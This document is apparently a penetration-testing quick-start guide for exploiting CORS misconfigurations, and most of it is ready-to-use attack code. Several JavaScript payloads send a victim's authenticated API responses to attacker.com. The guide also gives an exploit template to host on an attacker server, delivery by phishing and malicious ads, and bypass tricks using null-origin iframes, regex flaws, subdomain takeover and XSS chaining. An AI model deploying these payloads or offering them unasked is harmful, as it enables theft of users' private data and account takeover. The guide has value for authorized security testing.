# CORS (Cross-Origin Resource Sharing) - Quick Start Guide

Rapid exploitation reference for CORS misconfiguration vulnerabilities.

> For full payload reference, defense guides, and reporting templates, see [cors-cheat-sheet.md](cors-cheat-sheet.md).

---

## Critical Headers

- `Access-Control-Allow-Origin`: Which origins can access resources
- `Access-Control-Allow-Credentials`: Whether cookies/auth are allowed
- `Origin`: Browser-set header indicating request origin

---

## 60-Second Vulnerability Check

### Step 1: Find Authenticated Endpoint
```bash
# Login and browse application
# Look for API endpoints returning sensitive data
```

### Step 2: Test with Burp Repeater
```http
GET /api/userdata HTTP/1.1
Host: victim.com
Origin: https://evil.com
Cookie: session=abc123
```

### Step 3: Check Response
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com  <- Vulnerable!
Access-Control-Allow-Credentials: true         <- Critical!
```

**If both headers present = EXPLOITABLE**

---

## Common Payloads

### Basic Data Theft
```javascript
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api/data', true);
req.withCredentials = true;
req.onload = function() {
    fetch('https://attacker.com/log?data=' + btoa(this.responseText));
};
req.send();
```

### With Error Handling
```javascript
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api/data', true);
req.withCredentials = true;
req.onload = function() {
    if (this.status === 200) {
        navigator.sendBeacon('https://attacker.com/log', this.responseText);
    }
};
req.onerror = function() {
    console.log('CORS blocked or network error');
};
req.send();
```

### POST Request with CORS
```javascript
var req = new XMLHttpRequest();
req.open('post', 'https://victim.com/api/action', true);
req.withCredentials = true;
req.setRequestHeader('Content-Type', 'application/json');
req.onload = function() {
    fetch('https://attacker.com/log?response=' + this.responseText);
};
req.send(JSON.stringify({ action: 'malicious' }));
```

---

## Testing Checklist

### Manual Testing (Burp Repeater)

```
Test #1: Arbitrary Origin
Origin: https://evil.com
  Check if reflected in Access-Control-Allow-Origin

Test #2: Null Origin
Origin: null
  Check if explicitly allowed

Test #3: Protocol Downgrade
Origin: http://subdomain.victim.com
  From HTTPS app, test HTTP origin

Test #4: Subdomain
Origin: https://attacker.victim.com
  Test if subdomains trusted

Test #5: Domain Suffix
Origin: https://victim.com.evil.com
  Test regex bypass

Test #6: Domain Prefix
Origin: https://evilsvictim.com
  Test prefix matching

Test #7: Character Bypass
Origin: https://victimXcom
  Test if . is treated as wildcard
```

### Critical Indicators

**VULNERABLE if:**
- `Access-Control-Allow-Origin` reflects arbitrary origin
- `Access-Control-Allow-Credentials: true`
- Response contains sensitive data

**NOT EXPLOITABLE if:**
- `Access-Control-Allow-Origin: *` (no credentials)
- `Access-Control-Allow-Credentials` is false/absent
- Static whitelist of trusted origins only

---

## Exploitation Workflow

### 1. Reconnaissance
```bash
# Proxy traffic through Burp
# Login to application
# Identify endpoints returning:
- User data (email, API keys, tokens)
- Account details
- Sensitive business data
- Admin functionality
```

### 2. Vulnerability Confirmation
```bash
# In Burp Repeater:
1. Add Origin header with evil domain
2. Verify reflection in response
3. Check Access-Control-Allow-Credentials
4. Confirm sensitive data in response body
```

### 3. Exploit Development
```html
<!-- Host on attacker server -->
<script>
// Customize for target endpoint
var req = new XMLHttpRequest();
req.open('get', 'TARGET_URL', true);
req.withCredentials = true;
req.onload = function() {
    // Exfiltrate data
    fetch('ATTACKER_LOG_URL?data=' + btoa(this.responseText));
};
req.send();
</script>
```

### 4. Delivery
```
Methods:
- Social engineering (phishing)
- Malicious ads
- Compromised websites
- XSS on trusted domains
```

---

## Bypass Techniques

### 1. Null Origin via Sandbox
```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="...">
```

### 2. File Protocol
```html
<!-- Save as local file, trick user to open -->
<script>
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api', true);
req.withCredentials = true;
req.send();
</script>
```

### 3. Data URL
```html
<iframe src="data:text/html,<script>...</script>">
```

### 4. Regex Bypass Patterns
```
Target regex: /victim\.com/

Bypasses:
- victim.com.attacker.com (missing end anchor $)
- attackervictim.com (missing start anchor ^)
- victimXcom.attacker.com (. matches any character)
```

### 5. Subdomain Takeover
```
1. Find abandoned subdomain (old-api.victim.com)
2. Register/takeover (AWS S3, GitHub Pages, etc.)
3. Host exploit code
4. Profit from trusted subdomain
```

### 6. XSS on Trusted Origin
```
If victim.com trusts subdomain.victim.com:
1. Find XSS on subdomain
2. Inject CORS exploitation code
3. Bypass same-origin policy
```

---

## Common Mistakes

### Exploit Not Working

**Forgot `withCredentials: true`**
```javascript
// Wrong - no cookies sent
req.open('get', url, true);

// Correct
req.open('get', url, true);
req.withCredentials = true;
```

**Not URL Encoding**
```javascript
// Wrong
location = '/log?data=' + responseText;

// Correct
location = '/log?data=' + encodeURIComponent(responseText);
```

### Sandbox Issues

```html
<!-- Wrong - gets parent origin, not null -->
<iframe sandbox="allow-scripts allow-same-origin">

<!-- Correct - forces null origin -->
<iframe sandbox="allow-scripts allow-top-navigation">
```

---

## Risk Assessment

### Severity: HIGH to CRITICAL

**Impact:**
- Complete account takeover
- Sensitive data theft (API keys, tokens, PII)
- Privilege escalation
- Business logic bypass

**CVSS Example:**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
Score: 9.3 (Critical)
```

---

## One-Liners

### Test with cURL
```bash
curl -H "Origin: https://evil.com" -H "Cookie: session=abc" -i https://victim.com/api
```

### Quick Burp Test
```
1. Ctrl+R (Send to Repeater)
2. Add: Origin: https://evil.com
3. Send
4. Check response headers
```

### Minimal PoC
```html
<script>fetch('https://victim.com/api',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/?data='+btoa(d)))</script>
```

### Null Origin Iframe
```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://victim.com/api',{credentials:'include'}).then(r=>r.text()).then(d=>parent.postMessage(d,'*'))</script>"></iframe>
```

---

## Pro Tips

1. **Always test with credentials**: CORS without credentials is usually not exploitable
2. **Check Vary header**: Missing `Vary: Origin` can lead to cache poisoning
3. **Test all protocols**: HTTP, HTTPS, file://, data:, null
4. **Subdomain enumeration**: Find and test all subdomains for XSS + CORS chains
5. **Internal networks**: Don't forget 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12
6. **Preflight requests**: Complex requests trigger OPTIONS preflight - test both
7. **Regex anchors**: Always check for missing `^` and `$` in origin validation
8. **Script splitting**: Use `</scr'+'ipt>` to avoid closing outer script tags
9. **Base64 encoding**: Use `btoa()` for binary-safe data exfiltration
